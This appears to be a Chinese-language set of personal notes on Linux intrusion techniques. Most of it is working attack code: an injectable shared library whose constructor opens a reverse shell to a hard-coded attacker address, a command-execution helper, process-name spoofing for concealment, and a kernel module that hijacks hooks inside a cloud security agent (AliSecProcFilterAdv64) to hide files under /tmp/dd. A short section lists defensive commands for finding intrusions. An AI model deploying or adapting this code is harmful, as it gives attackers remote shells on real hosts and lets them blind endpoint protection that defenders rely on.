\#反弹shell

lib文件

```c
#include <stdio.h>
#include <stdlib.h>
#include <syslog.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define ATTACKER_IP "192.168.1.127"
#define ATTACKER_PORT 5555

__attribute__((constructor))
static void init()
{
    printf("Library successfully injected!\n");
    syslog(LOG_CRIT, "Library called\n");
    
    //Just a sample reverse shell (https://www.revshells.com/)
    pid_t pid = fork();
    if(pid==0){
        int port = ATTACKER_PORT;
        struct sockaddr_in revsockaddr;

        int sockt = socket(AF_INET, SOCK_STREAM, 0);
        revsockaddr.sin_family = AF_INET;       
        revsockaddr.sin_port = htons(port);
        revsockaddr.sin_addr.s_addr = inet_addr(ATTACKER_IP);

        connect(sockt, (struct sockaddr *) &revsockaddr, 
        sizeof(revsockaddr));
        dup2(sockt, 0);
        dup2(sockt, 1);
        dup2(sockt, 2);

        char * const argv[] = {"/bin/sh", NULL};
        execve("/bin/sh", argv, NULL);
    }
}
```

# 命令执行

```c
char *execute_command(char *command) {
	FILE *fp;
	char *res = calloc(4096, sizeof(char));
	char buf[1024];

	fp = popen(command, "r");
	if (fp == NULL) {
		perror("Failed to run command");
		return NULL;
	}

	while (fgets(buf, sizeof(buf), fp) != NULL) {
		strcat(res, buf);
	}

	pclose(fp);
	return res;
}
```

# 进程名修改

```c

#include <unistd.h>
#include <stdio.h>
#include <stdarg.h>
#include <string.h>
#include <stdlib.h>
#include <sys/prctl.h>
#define MAXLINE 2048
extern char **environ;
static char **g_main_Argv = NULL;    /* pointer to argument vector */
static char *g_main_LastArgv = NULL; /* end of argv */

void setproctitle_init(int argc, char **argv, char **envp)
{
    int i;
    for (i = 0; envp[i] != NULL; i++) // calc envp num
        continue;
    environ = (char **)malloc(sizeof(char *) * (i + 1)); // malloc envp pointer

    for (i = 0; envp[i] != NULL; i++)
    {
        environ[i] = malloc(sizeof(char) * strlen(envp[i]));
        strcpy(environ[i], envp[i]);
    }
    environ[i] = NULL;
    g_main_Argv = argv;
    if (i > 0)
        g_main_LastArgv = envp[i - 1] + strlen(envp[i - 1]);
    else
        g_main_LastArgv = argv[argc - 1] + strlen(argv[argc - 1]);
}
void setproctitle(const char *fmt, ...)
{
    char *p;
    int i;
    char buf[MAXLINE];
    extern char **g_main_Argv;
    extern char *g_main_LastArgv;
    va_list ap;
    p = buf;
    va_start(ap, fmt);
    vsprintf(p, fmt, ap);
    va_end(ap);
    i = strlen(buf);
    if (i > g_main_LastArgv - g_main_Argv[0] - 2)
    {
        i = g_main_LastArgv - g_main_Argv[0] - 2;
        buf[i] = '\0';
    }
    (void)strcpy(g_main_Argv[0], buf);
    p = &g_main_Argv[0][i];
    while (p < g_main_LastArgv)
        *p++ = '\0';
    g_main_Argv[1] = NULL;
    prctl(PR_SET_NAME, buf);
}
int main(int argc, char *argv[])
{
    char argv_buf[MAXLINE] = {0}; // save argv paramters
    for (int i = 1; i < argc; i++)
    {
        strcat(argv_buf, argv[i]);
        strcat(argv_buf, " ");
    }
    setproctitle_init(argc, argv, environ);
    setproctitle("%s@%s %s", "new_name", "ip", argv_buf);
    for (int i = 0; environ[i] != NULL; i++)
        free(environ[i]);
    getchar();
    return 0;
}

```

<https://www.cnblogs.com/my_life/articles/5209213.html>

# 资料

Earth Lusca Employs New Linux Backdoor, Uses Cobalt Strike for Lateral Movement

<https://www.trendmicro.com/en_us/research/23/i/earth-lusca-employs-new-linux-backdoor.html>

mandibule: linux elf injector

<https://github.com/ixty/mandibule>

BPFDoor - An Evasive Linux Backdoor Technical Analysis

<https://sandflysecurity.com/blog/bpfdoor-an-evasive-linux-backdoor-technical-analysis/>

# 检测技术

### search for any kind of process with a deleted binary

    ls -alR /proc/*/exe 2> /dev/null | grep deleted

### Locating Packet Sniffing Processes

    grep packet_recvmsg /proc/*/stack
    grep wait_for_more_packets /proc/*/stack

### 查找详细的入侵痕迹

*   执行last,lastlog命令，查看最近登录的账户和登录时间，锁定异常账户。

*   执行grep -i Accepted /var/log/secure命令，查看远程登录成功的IP地址。

*   执行以下命令，查找计划任务

    cat /var/spool/cron/
    cat /etc/cron.hourly
    cat /etc/crontab

*   执行find / -ctime 1通过文件状态最后修改时间来查找木马文件。

*   检查/etc/passwd和/etc/shadow文件，确认是否有可疑用户。

*   检查临时目录/tmp、/vat/tmp、/dev/shm下的文件，这些目录权限是1777，容易被上传木马文件。

*   查看端口对外的服务日志是否存在异常，例如：tomcat、nginx。

*   执行service --status-all | grep running，查看当前运行的服务中是否存在异常。

*   执行chkconfig --list | grep \:on，查看自启动的服务中是否存在异常。

*   执行ls -lt /etc/init.d/ | head，查看是否有异常启动脚本。

### 使用常用木马查杀命令

ps，top	查看运行的进程和进程系统资源占用情况，查找异常进程。
pstree	以树状图的形式显示进程间的关系。
lsof	查看进程打开的文件、文件或目录被哪个进程占用、打开某个端口的进程、系统所有打开的端口等信息。
netstat	查看系统监听的所有端口、网络连接情况，查找连接数过多的IP地址等信息。
iftop	监控TCP连接实时网络流量，可分别分析出入流量并进行排序，查找出流量异常的IP地址。
nethogs	监控每个进程使用的网络流量，并从高到低排序，方便查找出流量异常的进程。
strace	追踪一个进程执行的系统调用，分析木马进程的运行情况。
strings	输出文件中可打印的字符串，可用来分析木马程序。

### 资料

How To Recover A Deleted Binary From Active Linux Malware

<https://sandflysecurity.com/blog/how-to-recover-a-deleted-binary-from-active-linux-malware/>

Linux下进程隐藏 三 - 高版本Linux下简易Rootkit编写

<https://9bie.org/index.php/archives/847/>

```c
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/init.h>
#include <linux/kprobes.h>
#include <linux/list.h>
#include <asm/page.h>
#include <linux/version.h>
#include <asm/cmpxchg.h>
#include <linux/namei.h>

struct module_layout ali_proc_filter_core_layout;
struct module_layout ali_proc_filter_init_layout;
struct module *p_ali_sec_proc_filter_module = NULL;


/**
* @name
* @real_addr : real kernel address of the function entry
* @ali_hook_addr : ali hook function addr
*/
struct ali_hook{
        char *name;
        unsigned long real_addr;
        unsigned long ali_hook_addr;
        unsigned long *p_ali_hook_addr_addr; 
        unsigned long my_hook_addr;
};

#define HOOK(_name,_my_hook_addr)	\
 {				\
  .name      = (_name),	\
                .real_addr = (0),	\
                .ali_hook_addr = (0),	\
                .p_ali_hook_addr_addr = (NULL),	\
                .my_hook_addr = (unsigned long)(_my_hook_addr),\
 }
#define MAY_OPEN_IDX 0
#define LOAD_MODULE_INDEX 1
#define INET_STREAM_CONNECT_INDEX 2
#define INET_LISTEN_INDEX 3
#define ARCH_PTRACE_INDEX 4
#define PREPARE_KERNEL_CRED_INDEX 5
#define VM_MMAP_PGOFF_INDEX 6
#define USERFAULTFD_IOCTL_INDEX 7
#define VFS_STATX_INDEX 8

struct load_info;
int my_may_open(struct path *path, int acc_mode, int flag);
int my_load_module(struct load_info *info, const char __user *uargs,int flags);
int my_inet_stream_connect(struct socket *sock, struct sockaddr *uaddr,int addr_len, int flags);
int my_inet_listen(struct socket *sock, int backlog);
long my_arch_ptrace(struct task_struct *child, long request,unsigned long addr, unsigned long data);
struct cred *my_prepare_kernel_cred(struct task_struct *daemon);
unsigned long my_vm_mmap_pgoff(struct file *file, unsigned long addr,unsigned long len, unsigned long prot,unsigned long flag, unsigned long pgoff);
long my_userfaultfd_ioctl(struct file *file, unsigned cmd,unsigned long arg);
int my_vfs_statx(int dfd, const char __user *filename, int flags,struct kstat *stat, u32 request_mask);

static struct ali_hook ali_hooks[] = {
 HOOK("may_open",my_may_open),
 HOOK("load_module",my_load_module),
        HOOK("inet_stream_connect",my_inet_stream_connect),
 HOOK("inet_listen",my_inet_listen),
        HOOK("arch_ptrace",my_arch_ptrace),
 HOOK("prepare_kernel_cred",my_prepare_kernel_cred),
        HOOK("vm_mmap_pgoff",my_vm_mmap_pgoff),
 HOOK("userfaultfd_ioctl",my_userfaultfd_ioctl),
        HOOK("vfs_statx",my_vfs_statx),
};

typedef int (may_open_isra_func_type)(struct path path, int acc_mode, int flag);
int my_may_open_isra(struct path path, int acc_mode, int flag)
{
        int ret;
        char buf[255];
        char *cp;

        cp = d_path(&path, buf, 255);
        //printk("may_open_isra\n");

        if (!IS_ERR(cp)){
            if(( strlen(cp) >= 7 )&&(cp[0] == '/' && cp[1] == 't' && cp[2] == 'm' && cp[3] == 'p' && cp[4] == '/' && cp[5] == 'd' && cp[6] == 'd')){
                printk("may_open in /tmp/dd dir: %s\n",cp);
                memcpy(&p_ali_sec_proc_filter_module->core_layout,&__this_module.core_layout,sizeof(struct module_layout));
                memcpy(&p_ali_sec_proc_filter_module->init_layout,&__this_module.init_layout,sizeof(struct module_layout));
                ret = ((may_open_isra_func_type*)(ali_hooks[MAY_OPEN_IDX].real_addr    ))(path,acc_mode,flag);
                memcpy(&p_ali_sec_proc_filter_module->core_layout,&ali_proc_filter_core_layout,sizeof(struct module_layout));
                memcpy(&p_ali_sec_proc_filter_module->init_layout,&ali_proc_filter_init_layout,sizeof(struct module_layout));
            }else{
                ret = ((may_open_isra_func_type*)(ali_hooks[MAY_OPEN_IDX].ali_hook_addr))(path,acc_mode,flag);
            }
        }else{
            ret = ((may_open_isra_func_type*)(ali_hooks[MAY_OPEN_IDX].ali_hook_addr))(path,acc_mode,flag);
        }
        return ret;
}

typedef int (may_open_func_type)(struct path *path, int acc_mode, int flag);
int my_may_open(struct path *path, int acc_mode, int flag)
{
        int ret;
        char buf[255];
        char *cp;

        cp = d_path(path, buf, 255);
        //printk("may_open_isra\n");

        if (!IS_ERR(cp)){
            if(( strlen(cp) >= 7 )&&(cp[0] == '/' && cp[1] == 't' && cp[2] == 'm' && cp[3] == 'p' && cp[4] == '/' && cp[5] == 'd' && cp[6] == 'd')){
                printk("may_open in /tmp/dd dir:%s\n",cp);
                memcpy(&p_ali_sec_proc_filter_module->core_layout,&__this_module.core_layout,sizeof(struct module_layout));
                memcpy(&p_ali_sec_proc_filter_module->init_layout,&__this_module.init_layout,sizeof(struct module_layout));
                ret = ((may_open_func_type*)(ali_hooks[MAY_OPEN_IDX].real_addr    ))(path,acc_mode,flag);
                memcpy(&p_ali_sec_proc_filter_module->core_layout,&ali_proc_filter_core_layout,sizeof(struct module_layout));
                memcpy(&p_ali_sec_proc_filter_module->init_layout,&ali_proc_filter_init_layout,sizeof(struct module_layout));
            }else{
                ret = ((may_open_func_type*)(ali_hooks[MAY_OPEN_IDX].ali_hook_addr))(path,acc_mode,flag);
            }
        }else{
            ret = ((may_open_func_type*)(ali_hooks[MAY_OPEN_IDX].ali_hook_addr))(path,acc_mode,flag);
        }
        return ret;
}

typedef int (load_module_func_type)(struct load_info *info, const char __user *uargs,int flags);
int my_load_module(struct load_info *info, const char __user *uargs,int flags)
{
        int ret;
        printk("my_load_module\n");
        
        ret = ((load_module_func_type*)(ali_hooks[LOAD_MODULE_INDEX].ali_hook_addr))(info,uargs,flags);
        return ret;
}


typedef int (inet_stream_connect_func_type)(struct socket *sock, struct sockaddr *uaddr,
   int addr_len, int flags);

int my_inet_stream_connect(struct socket *sock, struct sockaddr *uaddr,
   int addr_len, int flags)
{
        int ret;
        printk("my_inet_stream_connect\n");
        
        ret = ((inet_stream_connect_func_type*)(ali_hooks[INET_STREAM_CONNECT_INDEX].ali_hook_addr))(sock,uaddr,addr_len,flags);
        return ret;
}

typedef int (inet_listen_func_type)(struct socket *sock, int backlog);
int my_inet_listen(struct socket *sock, int backlog)
{
        int ret;
        printk("my_inet_listen\n");
        
        ret = ((inet_listen_func_type*)(ali_hooks[INET_LISTEN_INDEX].ali_hook_addr))(sock,backlog);
        return ret;
}

typedef long (arch_ptrace_func_type)(struct task_struct *child, long request,unsigned long addr, unsigned long data);
long my_arch_ptrace(struct task_struct *child, long request,unsigned long addr, unsigned long data)
{
        long ret;
        printk("my_arch_ptrace\n");
        
        ret = ((arch_ptrace_func_type*)(ali_hooks[ARCH_PTRACE_INDEX].ali_hook_addr))(child,request,addr,data);

        return ret;
}

typedef struct cred *(prepare_kernel_cred_func_type)(struct task_struct *daemon);
struct cred *my_prepare_kernel_cred(struct task_struct *daemon)
{
        struct cred *ret;
        
        printk("my_prepare_kernel_cred\n");
        
        ret = ((prepare_kernel_cred_func_type*)(ali_hooks[PREPARE_KERNEL_CRED_INDEX].ali_hook_addr))(daemon);

        return ret;
}

typedef unsigned long (vm_mmap_pgoff_func_type)(struct file *file, unsigned long addr,
 unsigned long len, unsigned long prot,
 unsigned long flag, unsigned long pgoff);
unsigned long my_vm_mmap_pgoff(struct file *file, unsigned long addr,
 unsigned long len, unsigned long prot,
 unsigned long flag, unsigned long pgoff)
{
        unsigned long ret;
        printk("my_vm_mmap_pgoff\n");
        
        ret = ((vm_mmap_pgoff_func_type*)(ali_hooks[VM_MMAP_PGOFF_INDEX].ali_hook_addr))(file,addr,len,prot,flag,pgoff);

        return ret;
}

typedef long (userfaultfd_ioctl_func_type)(struct file *file, unsigned cmd,
         unsigned long arg);
long my_userfaultfd_ioctl(struct file *file, unsigned cmd,
         unsigned long arg)
{
        long ret;
        printk("my_userfaultfd_ioctl\n");
        
        ret = ((userfaultfd_ioctl_func_type*)(ali_hooks[USERFAULTFD_IOCTL_INDEX].ali_hook_addr))(file,cmd,arg);

        return ret;
}

typedef int (vfs_statx_func_type)(int dfd, const char __user *filename, int flags,
       struct kstat *stat, u32 request_mask);
int my_vfs_statx(int dfd, const char __user *filename, int flags,struct kstat *stat, u32 request_mask)
{
        int ret;
        struct path path;
	int error = -EINVAL;
	unsigned int lookup_flags = LOOKUP_FOLLOW | LOOKUP_AUTOMOUNT;
        char buf[255];
        char *cp;
        
        //printk("my_vfs_statx\n");

	if ((flags & ~(AT_SYMLINK_NOFOLLOW | AT_NO_AUTOMOUNT |
		       AT_EMPTY_PATH | KSTAT_QUERY_FLAGS)) != 0)
		return -EINVAL;

	if (flags & AT_SYMLINK_NOFOLLOW)
		lookup_flags &= ~LOOKUP_FOLLOW;
	if (flags & AT_NO_AUTOMOUNT)
		lookup_flags &= ~LOOKUP_AUTOMOUNT;
	if (flags & AT_EMPTY_PATH)
		lookup_flags |= LOOKUP_EMPTY;
        error = user_path_at(dfd, filename, lookup_flags, &path);

        if(error){
                ret = ((vfs_statx_func_type*)(ali_hooks[VFS_STATX_INDEX].ali_hook_addr))(dfd,filename,flags,stat,request_mask);
        }else{

                cp = d_path(&path, buf, 255);
                if(IS_ERR(cp)){
                        ret = ((vfs_statx_func_type*)(ali_hooks[VFS_STATX_INDEX].ali_hook_addr))(dfd,filename,flags,stat,request_mask);
                }else{
                        if(( strlen(cp) >= 7 )&&(cp[0] == '/' && cp[1] == 't' && cp[2] == 'm' && cp[3] == 'p' && cp[4] == '/' && cp[5] == 'd' && cp[6] == 'd')){
                                printk("vfs_state in /tmp/dd dir: %s\n",cp);
                                memcpy(&p_ali_sec_proc_filter_module->core_layout,&__this_module.core_layout,sizeof(struct module_layout));
                                memcpy(&p_ali_sec_proc_filter_module->init_layout,&__this_module.init_layout,sizeof(struct module_layout));
                                ret = ((vfs_statx_func_type*)(ali_hooks[VFS_STATX_INDEX].real_addr    ))(dfd,filename,flags,stat,request_mask);
                                memcpy(&p_ali_sec_proc_filter_module->core_layout,&ali_proc_filter_core_layout,sizeof(struct module_layout));
                                memcpy(&p_ali_sec_proc_filter_module->init_layout,&ali_proc_filter_init_layout,sizeof(struct module_layout));
                        }else{
                                ret = ((vfs_statx_func_type*)(ali_hooks[VFS_STATX_INDEX].ali_hook_addr))(dfd,filename,flags,stat,request_mask);
                        }
                }
        }
        
        return ret;
}

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)
static unsigned long lookup_name(const char *name)
{
 struct kprobe kp = {
  .symbol_name = name
 };
 unsigned long retval;

 if (register_kprobe(&kp) < 0) return 0;
 retval = (unsigned long) kp.addr;
 unregister_kprobe(&kp);
 return retval;
}
#else
static unsigned long lookup_name(const char *name)
{
 return kallsyms_lookup_name(name);
}
#endif

static int resolve_hooks_real_address(struct ali_hook* ali_hooks,int count)
{
        int i = 0;
        struct ali_hook *ali_hook;
        for(i = 0;i<count;i++){
                ali_hook = &ali_hooks[i];
                ali_hook->real_addr = lookup_name(ali_hook->name);
                if((strcmp(ali_hook->name,"may_open") == 0) && (ali_hook->real_addr == 0))
                {
                        ali_hook->name = "may_open.isra.64";
                        ali_hook->my_hook_addr = (unsigned long)my_may_open_isra;
                        ali_hook->real_addr = lookup_name("may_open.isra.64");
                        if(ali_hook->real_addr == 0){
                                printk("resolve may_open addr error\n");
                                return -1;
                        }
                }
                if(ali_hook->real_addr == 0){
                                printk("resolve %s addr error\n",ali_hook->name);
                                return -1;                        
                }
                printk("resolve %s addr: 0x%lx\n",ali_hook->name,ali_hook->real_addr);
        }

        return 0;
}

static int resolve_ali_hooks_address(struct ali_hook* ali_hooks,int count,unsigned long *start_search_addr,unsigned int search_count)
{
        int i;
        int k;
        struct ali_hook *ali_hook;

        for(i = 0;i<count;i++){
                ali_hook = &ali_hooks[i];

                for(k = 0;k<search_count;k++){
                        if(ali_hook->real_addr == start_search_addr[k]){
                                ali_hook->ali_hook_addr = start_search_addr[k+1];
                                ali_hook->p_ali_hook_addr_addr = &start_search_addr[k+1];

                                printk("%s found ali hook addr: 0x%lx , addr addr :%p\n",ali_hook->name,ali_hook->ali_hook_addr,ali_hook->p_ali_hook_addr_addr);
                                break;
                        }
                }
        }

        return 0;
}

static void replace_ali_hook(int idx)
{
        struct ali_hook *hook;
        hook = &ali_hooks[idx];
        cmpxchg(hook->p_ali_hook_addr_addr,hook->ali_hook_addr,hook->my_hook_addr);
}

static void restore_ali_hook(int idx)
{
        struct ali_hook *hook;
        hook = &ali_hooks[idx];
        cmpxchg(hook->p_ali_hook_addr_addr,hook->my_hook_addr,hook->ali_hook_addr);
}

static int __init myinit(void)  
{
        struct module *p_module = NULL;
        unsigned long *start_search_addr;
        unsigned int search_size;
        unsigned int search_count;

        printk("my hello module init\n");
         
        list_for_each_entry(p_module,&(__this_module.list),list){
                if(strcmp("AliSecProcFilterAdv64",p_module->name) == 0) {
                        p_ali_sec_proc_filter_module = p_module;
                }
        }

        if(p_ali_sec_proc_filter_module == NULL){
                printk("find AliSecProcFilterAdv64 module error\n");
                return -1;
        }else{
                printk("find AliSecProcFilterAdv64 module ok\n");
        }

        memcpy(&ali_proc_filter_core_layout,&p_ali_sec_proc_filter_module->core_layout,sizeof(struct module_layout));
        memcpy(&ali_proc_filter_init_layout,&p_ali_sec_proc_filter_module->init_layout,sizeof(struct module_layout));
        

        start_search_addr = (unsigned long *)(((unsigned long)(p_ali_sec_proc_filter_module->core_layout.base)) & 0xFFFFFFFFFFFFFFF8);
        search_size = (p_ali_sec_proc_filter_module->core_layout.size & 0xFFFFFFFFFFFFFFF8);
        search_count = search_size>>3;
        printk("start search addr:%p search_size:%d\n",start_search_addr,search_size);

        if(resolve_hooks_real_address(ali_hooks,ARRAY_SIZE(ali_hooks))!=0){
                printk("resolve addr error\n");
                return -1;
        }

        if(resolve_ali_hooks_address(ali_hooks,ARRAY_SIZE(ali_hooks),start_search_addr,search_count)!=0){
                printk("resolve ali hook addr error\n");
                return -1;
        }
        // replace_ali_hook(LOAD_MODULE_INDEX);
        replace_ali_hook(INET_STREAM_CONNECT_INDEX);
        // replace_ali_hook(INET_LISTEN_INDEX);
        // replace_ali_hook(ARCH_PTRACE_INDEX);
        // replace_ali_hook(PREPARE_KERNEL_CRED_INDEX);
        // replace_ali_hook(VM_MMAP_PGOFF_INDEX);
        // replace_ali_hook(USERFAULTFD_IOCTL_INDEX);
        replace_ali_hook(VFS_STATX_INDEX);
        replace_ali_hook(MAY_OPEN_IDX);
        return 0;
}
 
static void __exit myexit(void)
{
        printk("my hello module exit\n");
        
        memcpy(&p_ali_sec_proc_filter_module->core_layout,&ali_proc_filter_core_layout,sizeof(struct module_layout));
        memcpy(&p_ali_sec_proc_filter_module->init_layout,&ali_proc_filter_init_layout,sizeof(struct module_layout));
        
        restore_ali_hook(MAY_OPEN_IDX);
        restore_ali_hook(VFS_STATX_INDEX);
        // restore_ali_hook(USERFAULTFD_IOCTL_INDEX);
        // restore_ali_hook(VM_MMAP_PGOFF_INDEX);
        // restore_ali_hook(PREPARE_KERNEL_CRED_INDEX);
        // restore_ali_hook(ARCH_PTRACE_INDEX);
        // restore_ali_hook(INET_LISTEN_INDEX);
        restore_ali_hook(INET_STREAM_CONNECT_INDEX);
        // restore_ali_hook(LOAD_MODULE_INDEX);
}
                 
module_init(myinit);
module_exit(myexit);
MODULE_LICENSE("GPL");
```

